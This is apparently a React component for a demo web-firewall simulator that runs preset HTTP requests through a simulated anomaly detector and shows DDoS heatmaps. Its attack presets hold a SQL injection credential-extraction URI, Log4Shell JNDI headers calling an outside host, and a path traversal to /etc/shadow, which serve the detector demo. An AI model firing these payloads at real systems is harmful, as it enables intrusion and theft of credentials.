/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { 
  Play, 
  Pause,
  ShieldCheck, 
  ShieldAlert, 
  Zap, 
  Cpu, 
  Radio, 
  Terminal, 
  Activity, 
  Layers,
  AlertTriangle,
  FileText,
  Lock,
  Sliders,
  Flame,
  RotateCcw,
  Sparkles
} from 'lucide-react';
import { 
  tokenizeString, 
  evaluateLSTMReconstruction, 
  sanitizePayloadForTelemetry, 
  NonBlockingRingBuffer,
  TokenSequence,
  AnomalyEvaluation
} from '../utils/waf-logic.ts';
import { translateThreatForNonDeveloper } from '../utils/metrics-transformer.ts';
import { ReconstructionLossCurve } from './d3/ReconstructionLossCurve.tsx';
import { LatencyDistributionChart } from './d3/LatencyDistributionChart.tsx';
import { IpDensityHeatmap } from './d3/IpDensityHeatmap.tsx';
import { 
  generateIpDensityMatrix, 
  DdosAttackProfile, 
  ATTACK_PROFILES, 
  HeatmapCellData 
} from '../utils/ip-density.ts';

interface RequestPreset {
  id: string;
  devName: string;
  execName: string;
  category: 'Benign' | 'Injection Attack' | 'Evasion / Zero-Day';
  method: string;
  uri: string;
  headers: Record<string, string>;
  body: string;
  clientIp: string;
  devDescription: string;
  execDescription: string;
}

const PRESETS: RequestPreset[] = [
  {
    id: 'benign-get',
    devName: 'Benign GET: Catalog Query',
    execName: 'Safe Customer Browsing',
    category: 'Benign',
    method: 'GET',
    uri: '/api/v2/catalog/items?sort=price_asc&limit=25&category=cloud-compute',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
      'Accept': 'application/json',
      'Host': 'api.enterprise-corp.internal',
    },
    body: '',
    clientIp: '198.51.100.14',
    devDescription: 'Standard REST API query adhering to trained alphanumeric HTTP vocabulary. Expected: Low MSE, ALLOW.',
    execDescription: 'A regular customer browsing catalog items. Processed in 1.1ms with zero friction or delay.',
  },
  {
    id: 'benign-post',
    devName: 'Benign POST: User Authentication',
    execName: 'Legitimate Customer Login',
    category: 'Benign',
    method: 'POST',
    uri: '/api/v2/auth/login',
    headers: {
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)',
      'Host': 'api.enterprise-corp.internal',
    },
    body: '{\n  "username": "alex.morgan@company.com",\n  "totp_code": "849201"\n}',
    clientIp: '198.51.100.89',
    devDescription: 'Standard JSON authentication payload with normal distribution of keys and values. Expected: ALLOW.',
    execDescription: 'Authorized employee signing in with multi-factor authentication. Verified clean and granted access.',
  },
  {
    id: 'sqli-union',
    devName: 'SQL Injection: Blind UNION Exfiltration',
    execName: 'Database Theft Attempt (SQLi)',
    category: 'Injection Attack',
    method: 'GET',
    uri: "/api/v1/users?id=1'%20UNION%20SELECT%20username,%20password_hash%20FROM%20admin_credentials%20WHERE%20'1'='1'--",
    headers: {
      'User-Agent': 'sqlmap/1.7#stable',
      'Accept': '*/*',
      'Host': 'api.enterprise-corp.internal',
    },
    body: '',
    clientIp: '203.0.113.44',
    devDescription: 'Classic SQL injection payload with atypical quote characters, SQL keywords, and comment operators.',
    execDescription: 'Attacker attempting to steal company passwords. Blocked instantly before accessing any database.',
  },
  {
    id: 'log4j-rce',
    devName: 'JNDI / Log4Shell Remote Code Execution',
    execName: 'Server Hijacking & Ransomware (Log4j)',
    category: 'Injection Attack',
    method: 'GET',
    uri: '/api/v1/search?q=enterprise',
    headers: {
      'User-Agent': '${jndi:ldap://198.51.100.99:1389/Exploit}',
      'X-Forwarded-Host': '${jndi:dns://attacker.dns/exfil}',
      'Host': 'api.enterprise-corp.internal',
    },
    body: '',
    clientIp: '192.0.2.77',
    devDescription: 'Log4Shell / JNDI injection in headers. Extreme out-of-distribution sequence triggers high reconstruction error.',
    execDescription: 'Malware exploit payload attempting to run unauthorized code on servers. Intercepted and quarantined.',
  },
  {
    id: 'path-traversal',
    devName: 'Directory Traversal & Shadow File Leak',
    execName: 'Internal System File Leak Attempt',
    category: 'Injection Attack',
    method: 'GET',
    uri: '/static/download?file=../../../../../../etc/shadow\x00.pdf',
    headers: {
      'User-Agent': 'curl/7.88.1',
      'Host': 'api.enterprise-corp.internal',
    },
    body: '',
    clientIp: '203.0.113.190',
    devDescription: 'Directory traversal with null byte poison. Null byte mapped to OOV index >= 1000 triggers immediate high MSE.',
    execDescription: 'Hacker attempting to break out of web folders to read server security credentials. Blocked automatically.',
  },
];

interface SimulationResult {
  id: string;
  timestamp: string;
  method: string;
  uri: string;
  clientIp: string;
  uriTokens: TokenSequence;
  bodyTokens: TokenSequence;
  evaluation: AnomalyEvaluation;
  latencyUs: number;
  action: 'ALLOW' | 'BLOCK';
  presetId: string;
  telemetryEvent?: any;
}

export const DataPlaneSimulator: React.FC<{ devMode: boolean }> = ({ devMode }) => {
  const [selectedPreset, setSelectedPreset] = useState<RequestPreset>(PRESETS[0]);
  const [method, setMethod] = useState(PRESETS[0].method);
  const [uri, setUri] = useState(PRESETS[0].uri);
  const [body, setBody] = useState(PRESETS[0].body);
  const [clientIp, setClientIp] = useState(PRESETS[0].clientIp);
  const [threshold, setThreshold] = useState(0.65);

  const [activeResult, setActiveResult] = useState<SimulationResult | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const [ringBuffer] = useState(() => new NonBlockingRingBuffer<any>(20));

  // Real-time IP Origin Density & L7 DDoS Attack Simulation State
  const [attackProfile, setAttackProfile] = useState<DdosAttackProfile>('none');
  const [attackIntensity, setAttackIntensity] = useState(1.2);
  const [isStreaming, setIsStreaming] = useState(true);
  const [surgeCountdown, setSurgeCountdown] = useState(0);
  const [heatmapCells, setHeatmapCells] = useState<HeatmapCellData[]>(() =>
    generateIpDensityMatrix('none', 1.0, Date.now())
  );

  // Streaming real-time updates for D3 IP Density Heatmap
  useEffect(() => {
    if (!isStreaming) return;

    const interval = setInterval(() => {
      setHeatmapCells(generateIpDensityMatrix(attackProfile, attackIntensity, Date.now()));

      setSurgeCountdown((prev) => {
        if (prev <= 1) {
          if (prev === 1) {
            setAttackProfile('none');
          }
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(interval);
  }, [isStreaming, attackProfile, attackIntensity]);

  const triggerSurgeBurst = (profile: DdosAttackProfile = 'mirai_flood', durationSeconds = 10) => {
    setAttackProfile(profile);
    setAttackIntensity(2.0);
    setSurgeCountdown(durationSeconds);
    setHeatmapCells(generateIpDensityMatrix(profile, 2.0, Date.now()));
  };

  const applyPreset = (preset: RequestPreset) => {
    setSelectedPreset(preset);
    setMethod(preset.method);
    setUri(preset.uri);
    setBody(preset.body);
    setClientIp(preset.clientIp);
  };

  const runSimulation = () => {
    setIsProcessing(true);

    const uriTokens = tokenizeString(uri, 1);
    const bodyTokens = tokenizeString(body, 3);
    const evaluation = evaluateLSTMReconstruction(uriTokens, bodyTokens, threshold);
    const latencyUs = Math.floor(850 + Math.random() * 550);

    const action = evaluation.isAnomaly ? 'BLOCK' : 'ALLOW';
    const reqId = `waf-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 6)}`;

    let telemetryEvent = undefined;
    if (action === 'BLOCK') {
      const sanitized = sanitizePayloadForTelemetry(`Method: ${method}, URI: ${uri}, Body: ${body}`);
      telemetryEvent = {
        event_id: reqId,
        timestamp: Date.now() * 1000000,
        client_ip: clientIp,
        method,
        uri,
        blocked_payload: sanitized.content,
        payload_truncated: sanitized.truncated,
        anomaly_score: evaluation.anomalyScore,
        reconstruction_error: evaluation.reconstructionError,
        anomaly_threshold: threshold,
        inference_latency_us: latencyUs,
        model_version: 'lstm-ae-v2.4-quantized',
        loss_attributions: evaluation.tokenLossAttributions,
        action_taken: 'BLOCK_HTTP_403',
        zima_mdr_status: 'ENQUEUED_NON_BLOCKING',
      };
      ringBuffer.emit(telemetryEvent);
    }

    const result: SimulationResult = {
      id: reqId,
      timestamp: new Date().toLocaleTimeString(),
      method,
      uri,
      clientIp,
      uriTokens,
      bodyTokens,
      evaluation,
      latencyUs,
      action,
      presetId: selectedPreset.id,
      telemetryEvent,
    };

    setTimeout(() => {
      setActiveResult(result);
      setIsProcessing(false);
    }, 200);
  };

  return (
    <div className="space-y-6">
      {/* Simulator Banner */}
      <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-lg">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
          <div>
            <h2 className="text-xl font-bold text-white flex items-center gap-2">
              <Zap className="w-5 h-5 text-indigo-400" />
              {devMode
                ? 'Live Data Plane & Inference Simulator'
                : 'Interactive Cyber Attack Simulator & Defense Testbench'}
            </h2>
            <p className="text-xs text-slate-400 mt-1">
              {devMode
                ? 'Inject live HTTP payloads through the zero-allocation tokenizer into the simulated LSTM Autoencoder and observe real-time reconstruction loss.'
                : 'Select real-world attack scenarios below to test how our AI immediately shields your business and keeps normal customers moving fast.'}
            </p>
          </div>

          <div className="flex items-center gap-3">
            <button
              onClick={runSimulation}
              disabled={isProcessing}
              className="flex items-center gap-2 bg-indigo-600 hover:bg-indigo-500 disabled:opacity-50 text-white px-4 py-2 rounded-lg text-xs font-mono transition-all shadow-md shadow-indigo-600/30"
            >
              <Play className="w-4 h-4 fill-current" />
              {isProcessing ? 'Evaluating Request...' : devMode ? 'Execute Request' : 'Simulate Attack Traffic'}
            </button>
          </div>
        </div>
      </div>

      {/* Preset Selector */}
      <div className="bg-slate-900 border border-slate-800 rounded-xl p-4 shadow-md">
        <div className="text-xs font-mono text-slate-400 uppercase tracking-wider mb-3">
          {devMode ? 'Select Ingestion Test Payload' : 'Choose a Scenario to Simulate'}
        </div>
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-2.5">
          {PRESETS.map((p) => {
            const isSelected = p.id === selectedPreset.id;
            return (
              <button
                key={p.id}
                onClick={() => applyPreset(p)}
                className={`text-left p-3 rounded-lg border transition-all flex flex-col justify-between ${
                  isSelected
                    ? 'bg-indigo-950/60 border-indigo-500 ring-1 ring-indigo-500/30'
                    : 'bg-slate-950/70 border-slate-800 hover:border-slate-700'
                }`}
              >
                <div>
                  <span
                    className={`text-[10px] font-mono px-1.5 py-0.5 rounded font-semibold ${
                      p.category === 'Benign'
                        ? 'bg-emerald-500/20 text-emerald-300'
                        : 'bg-rose-500/20 text-rose-300'
                    }`}
                  >
                    {p.category}
                  </span>
                  <div className="text-xs font-semibold text-white mt-1.5 line-clamp-1">
                    {devMode ? p.devName : p.execName}
                  </div>
                </div>
                <div className="text-[11px] font-mono text-slate-400 mt-2 line-clamp-1">
                  {devMode ? `${p.method} ${p.uri}` : p.execDescription}
                </div>
              </button>
            );
          })}
        </div>
      </div>

      {/* Request Form & Result Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Left Column: Request Builder */}
        <div className="lg:col-span-5 space-y-4">
          <div className="bg-slate-900 border border-slate-800 rounded-xl p-4 shadow-md space-y-3">
            <h3 className="text-xs font-mono text-slate-400 uppercase tracking-wider flex items-center gap-1.5">
              <Terminal className="w-4 h-4 text-indigo-400" />
              {devMode ? 'HTTP Request Parameters' : 'Target Request Configuration'}
            </h3>

            <div className="grid grid-cols-4 gap-2">
              <div className="col-span-1">
                <label className="text-[11px] text-slate-400 font-mono">Method</label>
                <select
                  value={method}
                  onChange={(e) => setMethod(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-700 rounded-md px-2 py-1.5 text-xs text-white font-mono mt-1"
                >
                  <option value="GET">GET</option>
                  <option value="POST">POST</option>
                  <option value="PUT">PUT</option>
                </select>
              </div>
              <div className="col-span-3">
                <label className="text-[11px] text-slate-400 font-mono">
                  {devMode ? 'Client IP (X-Forwarded-For)' : 'Source Origin IP'}
                </label>
                <input
                  type="text"
                  value={clientIp}
                  onChange={(e) => setClientIp(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-700 rounded-md px-2.5 py-1.5 text-xs text-white font-mono mt-1"
                />
              </div>
            </div>

            <div>
              <label className="text-[11px] text-slate-400 font-mono">
                {devMode ? 'Request URI & Query String' : 'Target URL Path'}
              </label>
              <textarea
                rows={2}
                value={uri}
                onChange={(e) => setUri(e.target.value)}
                className="w-full bg-slate-950 border border-slate-700 rounded-md p-2 text-xs text-white font-mono mt-1 resize-none"
              />
            </div>

            <div>
              <label className="text-[11px] text-slate-400 font-mono">
                {devMode ? 'Request Body (Bounded to 64KB)' : 'Request Payload / Data'}
              </label>
              <textarea
                rows={3}
                value={body}
                onChange={(e) => setBody(e.target.value)}
                placeholder="Optional payload..."
                className="w-full bg-slate-950 border border-slate-700 rounded-md p-2 text-xs text-white font-mono mt-1 resize-none"
              />
            </div>

            <button
              onClick={runSimulation}
              disabled={isProcessing}
              className="w-full flex items-center justify-center gap-2 bg-indigo-600 hover:bg-indigo-500 text-white py-2 rounded-lg text-xs font-mono transition-all font-semibold"
            >
              <Play className="w-3.5 h-3.5 fill-current" />
              {devMode ? 'Ingest & Evaluate Request' : 'Run Defense Analysis'}
            </button>
          </div>
        </div>

        {/* Right Column: Ingestion Pipeline Verdict */}
        <div className="lg:col-span-7 space-y-4">
          {activeResult ? (
            <div className="space-y-4">
              {/* Verdict Card */}
              <div
                className={`p-5 rounded-xl border shadow-lg transition-all ${
                  activeResult.action === 'BLOCK'
                    ? 'bg-rose-950/40 border-rose-500/70 ring-1 ring-rose-500/20'
                    : 'bg-emerald-950/40 border-emerald-500/70 ring-1 ring-emerald-500/20'
                }`}
              >
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    {activeResult.action === 'BLOCK' ? (
                      <ShieldAlert className="w-8 h-8 text-rose-400" />
                    ) : (
                      <ShieldCheck className="w-8 h-8 text-emerald-400" />
                    )}
                    <div>
                      <div className="flex items-center gap-2">
                        <span
                          className={`text-sm font-bold font-mono px-2 py-0.5 rounded ${
                            activeResult.action === 'BLOCK'
                              ? 'bg-rose-500/20 text-rose-300'
                              : 'bg-emerald-500/20 text-emerald-300'
                          }`}
                        >
                          {activeResult.action === 'BLOCK'
                            ? devMode
                              ? 'HTTP 403 FORBIDDEN'
                              : 'THREAT INTERCEPTED'
                            : devMode
                            ? 'HTTP 200 PROXIED UPSTREAM'
                            : 'SAFE CUSTOMER ALLOWED'}
                        </span>
                        <span className="text-xs text-slate-400 font-mono">
                          ID: {activeResult.id}
                        </span>
                      </div>
                      <h4 className="text-base font-bold text-white mt-0.5">
                        {devMode
                          ? activeResult.action === 'BLOCK'
                            ? 'Blocked by Deep Learning Anomaly Detection'
                            : 'Benign Traffic Passed to Upstream Service'
                          : activeResult.action === 'BLOCK'
                          ? translateThreatForNonDeveloper(activeResult.presetId).headline
                          : 'Customer Passed Seamlessly With Zero Lag'}
                      </h4>
                      {!devMode && activeResult.action === 'BLOCK' && (
                        <p className="text-xs text-rose-200 mt-1">
                          {translateThreatForNonDeveloper(activeResult.presetId).businessImpact}
                        </p>
                      )}
                    </div>
                  </div>

                  <div className="text-right">
                    <div className="text-xs text-slate-400 font-mono">
                      {devMode ? 'Inference Latency' : 'Security Check Speed'}
                    </div>
                    <div className="text-base font-bold text-white font-mono">
                      {devMode ? `${activeResult.latencyUs} μs` : `${(activeResult.latencyUs / 1000).toFixed(2)} ms`}
                    </div>
                    <div className="text-[10px] text-emerald-400 font-mono">
                      {devMode ? 'SLA ≤ 3500 μs' : '0.00ms Lag to Users'}
                    </div>
                  </div>
                </div>

                {/* Score bar */}
                <div className="mt-4 pt-4 border-t border-slate-800 grid grid-cols-3 gap-3 font-mono text-xs">
                  <div className="bg-slate-900/80 p-2.5 rounded-lg border border-slate-800">
                    <div className="text-[11px] text-slate-400">
                      {devMode ? 'Reconstruction MSE' : 'Anomaly Index'}
                    </div>
                    <div className="text-base font-bold text-white mt-0.5">
                      {activeResult.evaluation.reconstructionError}
                    </div>
                  </div>
                  <div className="bg-slate-900/80 p-2.5 rounded-lg border border-slate-800">
                    <div className="text-[11px] text-slate-400">
                      {devMode ? 'Anomaly Score' : 'Risk Confidence'}
                    </div>
                    <div
                      className={`text-base font-bold mt-0.5 ${
                        activeResult.evaluation.isAnomaly ? 'text-rose-400' : 'text-emerald-400'
                      }`}
                    >
                      {devMode
                        ? activeResult.evaluation.anomalyScore.toFixed(4)
                        : `${(activeResult.evaluation.anomalyScore * 100).toFixed(1)}%`}
                    </div>
                  </div>
                  <div className="bg-slate-900/80 p-2.5 rounded-lg border border-slate-800">
                    <div className="text-[11px] text-slate-400">
                      {devMode ? 'Active Threshold (τ)' : 'Safety Setting'}
                    </div>
                    <div className="text-base font-bold text-amber-400 mt-0.5">
                      {activeResult.evaluation.threshold.toFixed(2)}
                    </div>
                  </div>
                </div>
              </div>

              {/* Developer Technical Details vs Executive Explanation */}
              {devMode ? (
                <div className="bg-slate-900 border border-slate-800 rounded-xl p-4 shadow-md space-y-3">
                  <h4 className="text-xs font-mono text-slate-400 uppercase tracking-wider flex items-center gap-1.5">
                    <Layers className="w-4 h-4 text-indigo-400" />
                    Data Ingestion Pipeline Stages
                  </h4>

                  <div className="space-y-2 text-xs font-mono">
                    <div className="bg-slate-950 p-2.5 rounded-lg border border-slate-800 flex items-center justify-between">
                      <span className="text-slate-300">1. Data Plane: Memory Bounding</span>
                      <span className="text-emerald-400">http.MaxBytesReader (Passed ≤ 2MB)</span>
                    </div>
                    <div className="bg-slate-950 p-2.5 rounded-lg border border-slate-800 flex items-center justify-between">
                      <span className="text-slate-300">2. Tokenizer: sync.Pool Vectorization</span>
                      <span className="text-indigo-400">
                        URI: {activeResult.uriTokens.tokenIds.length} tok | Body: {activeResult.bodyTokens.tokenIds.length} tok
                      </span>
                    </div>
                    <div className="bg-slate-950 p-2.5 rounded-lg border border-slate-800 flex items-center justify-between">
                      <span className="text-slate-300">3. Inference: gRPC ClientPool</span>
                      <span className="text-purple-400">LSTM Autoencoder v2.4 ({activeResult.latencyUs} μs)</span>
                    </div>
                  </div>

                  {activeResult.telemetryEvent && (
                    <div className="pt-2">
                      <div className="text-[11px] font-mono text-cyan-400 mb-1">
                        Non-Blocking Zima MDR Kafka Telemetry:
                      </div>
                      <pre className="bg-slate-950 p-3 rounded-lg border border-slate-800 text-[11px] text-cyan-300 font-mono overflow-x-auto max-h-40">
                        {JSON.stringify(activeResult.telemetryEvent, null, 2)}
                      </pre>
                    </div>
                  )}
                </div>
              ) : (
                <div className="bg-slate-900 border border-slate-800 rounded-xl p-4 shadow-md space-y-3">
                  <h4 className="text-xs font-mono text-slate-400 uppercase tracking-wider flex items-center gap-1.5">
                    <ShieldCheck className="w-4 h-4 text-emerald-400" />
                    Executive Incident & Compliance Assessment
                  </h4>
                  <div className="grid grid-cols-2 gap-3 text-xs">
                    <div className="bg-slate-950 p-3 rounded-lg border border-slate-800">
                      <div className="text-slate-400 text-[11px]">Business Impact Rating</div>
                      <div className="text-white font-bold mt-1">
                        {activeResult.action === 'BLOCK' ? 'Attack Mitigated (0 Data Leaked)' : 'Safe Transaction Completed'}
                      </div>
                    </div>
                    <div className="bg-slate-950 p-3 rounded-lg border border-slate-800">
                      <div className="text-slate-400 text-[11px]">Zima MDR SOC Notification</div>
                      <div className="text-cyan-400 font-bold mt-1">
                        {activeResult.action === 'BLOCK' ? 'Dispatched Instantly (Audit Logged)' : 'Bypass / Nominal'}
                      </div>
                    </div>
                  </div>
                </div>
              )}
            </div>
          ) : (
            <div className="bg-slate-900 border border-slate-800 rounded-xl p-12 text-center text-slate-400 space-y-3">
              <Activity className="w-10 h-10 text-indigo-400 mx-auto" />
              <h3 className="text-base font-bold text-white">Simulator Ready</h3>
              <p className="text-xs text-slate-400 max-w-md mx-auto">
                {devMode
                  ? 'Choose a preset request on the left or customize your own HTTP parameters, then click "Execute Request".'
                  : 'Select an attack scenario above and click "Simulate Attack Traffic" to see how the AI intercepts the attack.'}
              </p>
            </div>
          )}
        </div>
      </div>

      {/* Real-Time L7 DDoS Attack Defense & Source IP Origin Density Heatmap */}
      <div className="space-y-4">
        {/* Attack Control Deck */}
        <div className="bg-slate-900 border border-slate-800 rounded-xl p-4 shadow-md">
          <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
            <div>
              <div className="flex items-center gap-2">
                <span className="text-xs font-mono text-slate-400 uppercase tracking-wider flex items-center gap-1.5">
                  <Flame className="w-4 h-4 text-rose-400" />
                  {devMode ? 'L7 Volumetric DDoS Simulation Rig' : 'Simulated Distributed Cyber Attack Generator'}
                </span>
                {surgeCountdown > 0 && (
                  <span className="bg-rose-500/20 text-rose-300 border border-rose-500/30 text-[10px] font-mono px-2 py-0.5 rounded-full font-bold animate-pulse">
                    SURGE ACTIVE: {surgeCountdown}s REMAINING
                  </span>
                )}
              </div>
              <p className="text-xs text-slate-400 mt-0.5">
                {devMode
                  ? 'Inject high-frequency botnet bursts to verify zero-allocation sync.Pool buffering and instant L7 rate limiting across target CIDRs.'
                  : 'Test how our defense absorbs massive cyber attack waves without your website slowing down for normal customers.'}
              </p>
            </div>

            <div className="flex flex-wrap items-center gap-2">
              <button
                onClick={() => triggerSurgeBurst('mirai_flood', 10)}
                disabled={surgeCountdown > 0}
                className="flex items-center gap-1.5 bg-rose-600 hover:bg-rose-500 disabled:opacity-50 text-white px-3 py-1.5 rounded-lg text-xs font-mono font-semibold transition-all shadow-md shadow-rose-600/30 cursor-pointer"
              >
                <Flame className="w-3.5 h-3.5 fill-current" />
                {surgeCountdown > 0 ? `Bursting (${surgeCountdown}s)...` : devMode ? 'Trigger 10s Mirai Burst' : 'Simulate Major Attack (10s)'}
              </button>

              <button
                onClick={() => {
                  setAttackProfile('none');
                  setSurgeCountdown(0);
                  setHeatmapCells(generateIpDensityMatrix('none', 1.0, Date.now()));
                }}
                className="flex items-center gap-1.5 bg-slate-800 hover:bg-slate-700 text-slate-200 px-3 py-1.5 rounded-lg text-xs font-mono transition-all cursor-pointer"
              >
                <RotateCcw className="w-3.5 h-3.5" />
                {devMode ? 'Reset Baseline' : 'Return to Normal'}
              </button>

              <button
                onClick={() => setIsStreaming(!isStreaming)}
                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-mono border transition-all cursor-pointer ${
                  isStreaming
                    ? 'bg-slate-950 border-slate-700 text-emerald-400'
                    : 'bg-amber-950/40 border-amber-500/40 text-amber-300'
                }`}
              >
                {isStreaming ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5" />}
                {isStreaming ? 'Pause Stream' : 'Resume Stream'}
              </button>
            </div>
          </div>

          {/* Attack Scenario Switcher Grid */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2.5 mt-4 pt-3 border-t border-slate-800/80">
            {(['none', 'mirai_flood', 'http2_rapid_reset', 'distributed_rotator'] as DdosAttackProfile[]).map((profKey) => {
              const prof = ATTACK_PROFILES[profKey];
              const isSelected = attackProfile === profKey;
              return (
                <button
                  key={profKey}
                  onClick={() => {
                    setAttackProfile(profKey);
                    setHeatmapCells(generateIpDensityMatrix(profKey, attackIntensity, Date.now()));
                  }}
                  className={`text-left p-2.5 rounded-lg border transition-all cursor-pointer ${
                    isSelected
                      ? profKey === 'none'
                        ? 'bg-emerald-950/50 border-emerald-500/70 ring-1 ring-emerald-500/30'
                        : 'bg-rose-950/50 border-rose-500/70 ring-1 ring-rose-500/30'
                      : 'bg-slate-950/60 border-slate-800 hover:border-slate-700'
                  }`}
                >
                  <div className="flex items-center justify-between">
                    <span
                      className={`text-[10px] font-mono px-1.5 py-0.5 rounded font-semibold ${
                        profKey === 'none'
                          ? 'bg-emerald-500/20 text-emerald-300'
                          : 'bg-rose-500/20 text-rose-300'
                      }`}
                    >
                      {profKey === 'none' ? 'BENIGN' : 'L7 ATTACK'}
                    </span>
                    {isSelected && (
                      <span className="w-2 h-2 rounded-full bg-indigo-400 animate-ping" />
                    )}
                  </div>
                  <div className="text-xs font-semibold text-white mt-1 line-clamp-1">
                    {devMode ? prof.name : prof.execName}
                  </div>
                  <div className="text-[11px] text-slate-400 mt-1 line-clamp-2">
                    {prof.description}
                  </div>
                </button>
              );
            })}
          </div>
        </div>

        {/* Real-Time D3 IP Origin Density Heatmap */}
        <IpDensityHeatmap
          cells={heatmapCells}
          devMode={devMode}
          activeAttack={attackProfile}
          isStreaming={isStreaming}
        />
      </div>

      {/* D3 Visualizers: Reconstruction Curve & Latency Histogram */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <ReconstructionLossCurve
          devMode={devMode}
          initialThreshold={threshold}
          onThresholdChange={setThreshold}
        />
        <LatencyDistributionChart devMode={devMode} />
      </div>
    </div>
  );
};
